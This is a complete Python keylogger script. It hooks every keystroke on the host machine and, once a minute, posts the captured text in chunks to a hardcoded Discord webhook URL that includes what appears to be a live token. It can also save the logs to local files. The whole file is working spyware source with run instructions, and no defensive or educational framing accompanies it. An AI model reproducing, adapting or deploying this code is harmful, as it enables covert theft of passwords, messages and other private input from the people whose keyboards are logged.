import keyboard # for keylogs
import requests # for sending HTTP requests to Discord webhook
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime
import time # Added for potential delay between chunks

# --- CONFIGURATION ---
SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute
# !!! REPLACE WITH YOUR ACTUAL DISCORD WEBHOOK URL !!!
DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1356566417775919204/nkDh1Lm-xtwf4Po0h1YzQ2v4vG6XID2vZwLTqfc1UoPkJe83Lqo3a3CJ2lX4yPXDlFTW"
# Set the maximum characters per Discord message (limit is 2000)
DISCORD_CHAR_LIMIT = 1990
# --- END CONFIGURATION ---


class Keylogger:
    def __init__(self, interval, report_method="discord"): # Defaulting to discord
        self.interval = interval
        self.report_method = report_method
        # String variable that contains the log of all keystrokes within `self.interval`
        self.log = ""
        # Record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()
        # Set the filename initially
        self.filename = ""
        self.update_filename() # Initialize filename based on start time

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event occurs
        (i.e., when a key is released in this example).
        """
        name = event.name
        if len(name) > 1:
            # Not a character, special key (e.g., ctrl, alt, etc.)
            # Uppercase with []
            if name == "space":
                name = " "  # " " instead of "space"
            elif name == "enter":
                name = "[ENTER]\n" # Add a new line
            elif name == "decimal":
                name = "."
            else:
                # Replace spaces with underscores for multi-word keys like 'page down'
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # Add the key name to the log
        self.log += name

    def update_filename(self):
        """Construct the filename based on start and end datetimes."""
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """Creates a log file in the current directory."""
        # Ensure the filename is updated before saving
        self.update_filename()
        filepath = f"{self.filename}.txt"
        try:
            with open(filepath, "w", encoding='utf-8') as f: # Use utf-8 encoding
                f.write(self.log)
            print(f"[+] Saved {filepath}")
        except Exception as e:
            print(f"[!] Failed to save file {filepath}: {e}")


    def send_to_discord(self, webhook_url, message):
        """Sends the message content to the specified Discord webhook URL."""
        if not webhook_url or webhook_url == "YOUR_DISCORD_WEBHOOK_URL_HERE":
            print("[!] Discord Webhook URL is not set. Skipping report.")
            return

        # Split message if it exceeds Discord's character limit
        chunks = [message[i:i+DISCORD_CHAR_LIMIT] for i in range(0, len(message), DISCORD_CHAR_LIMIT)]

        for i, chunk in enumerate(chunks):
            # Add indicator if message is split
            content_prefix = f"**Keylog Report Chunk ({i+1}/{len(chunks)})**\n" if len(chunks) > 1 else "**Keylog Report**\n"
            
            # Construct the JSON payload for Discord
            data = {
                # "content": content_prefix + "```\n" + chunk + "\n```" # Send as code block
                 "content": content_prefix + chunk # Send as plain text
            }
            
            headers = {
                "Content-Type": "application/json"
            }

            try:
                response = requests.post(webhook_url, json=data, headers=headers)
                response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
                print(f"[+] Discord report chunk {i+1}/{len(chunks)} sent successfully.")
                # Optional: Add a small delay between chunks to avoid rate limiting
                if len(chunks) > 1 and i < len(chunks) - 1:
                    time.sleep(1) 
            except requests.exceptions.RequestException as e:
                print(f"[!] Failed to send Discord report chunk {i+1}/{len(chunks)}: {e}")
            except Exception as e:
                 print(f"[!] An unexpected error occurred while sending to Discord: {e}")


    def report(self):
        """
        This function gets called every `self.interval`.
        It sends keylogs based on the chosen method and resets `self.log`.
        """
        if self.log:
            self.end_dt = datetime.now()
            
            # --- Reporting ---
            if self.report_method == "discord":
                print(f"[*] Reporting ({len(self.log)} chars) to Discord...")
                self.send_to_discord(DISCORD_WEBHOOK_URL, self.log)
            elif self.report_method == "file":
                print(f"[*] Reporting ({len(self.log)} chars) to file...")
                # update_filename is called within report_to_file
                self.report_to_file()
            # --- End Reporting ---

            # Reset the log and update start time for the next interval
            self.start_dt = datetime.now()
            self.log = ""
        else:
             # Optional: print a message if there was nothing to log
             # print("[*] No keys logged in this interval. Skipping report.")
             pass


        # Schedule the next report
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True # Allow program to exit even if timer is pending
        timer.start()

    def start(self):
        """Starts the keylogger and the reporting schedule."""
        self.start_dt = datetime.now()
        # Start listening for keyboard events
        keyboard.on_release(callback=self.callback)
        print("[+] Keylogger started.")
        # Start the first reporting timer
        self.report()
        print(f"[*] Reporting every {self.interval} seconds.")
        print(f"[*] Reporting method: {self.report_method}")
        if self.report_method == "discord" and DISCORD_WEBHOOK_URL == "YOUR_DISCORD_WEBHOOK_URL_HERE":
             print("[!] WARNING: Discord Webhook URL is not configured!")

        # Keep the main thread alive to listen for keys
        # Use keyboard.wait() to block until Esc is pressed (or specify another key)
        # Or use a simple loop if you prefer to exit with Ctrl+C
        print("[*] Press CTRL+C in the console to stop the keylogger.")
        try:
            while True:
                time.sleep(1) # Keep main thread alive
        except KeyboardInterrupt:
            print("\n[*] Stopping keylogger...")
            # Perform any final cleanup if needed, like sending one last report
            print("[*] Sending final report...")
            self.report_method = "discord" # Ensure final report goes to discord regardless of initial setting
            # Need to manually call report one last time as the timer won't fire again
            if self.log:
                self.end_dt = datetime.now()
                self.send_to_discord(DISCORD_WEBHOOK_URL, self.log + "\n[KEYLOGGER STOPPED]")
            print("[+] Keylogger stopped.")


if __name__ == "__main__":
    # --- How to Run ---
    # 1. Install requests: pip install requests
    # 2. Install keyboard: pip install keyboard
    # 3. !! Set your DISCORD_WEBHOOK_URL above !!
    # 4. Run the script (likely requires root/admin privileges): sudo python your_script_name.py

    # Report to Discord
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="discord")

    # Or, report to a local file
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")

    keylogger.start()